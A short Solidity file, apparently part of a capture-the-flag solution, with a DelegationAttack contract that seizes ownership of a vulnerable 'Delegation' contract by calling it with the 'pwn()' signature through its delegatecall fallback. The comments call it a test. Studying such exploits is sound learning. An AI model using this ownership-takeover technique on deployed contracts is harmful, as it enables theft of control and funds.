// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Delegation.sol";

// just to test how a contract would take ownership of Delegation
// attack() will take the ownership of the contract
// doesn't work for the challenge since now the owner is this contract
contract DelegationAttack {
    Delegation public delegation;

    constructor(address _delegation) public {
        delegation = Delegation(_delegation);
    }

    function attack() public {
        address(delegation).call(abi.encodeWithSignature("pwn()"));
    }
}
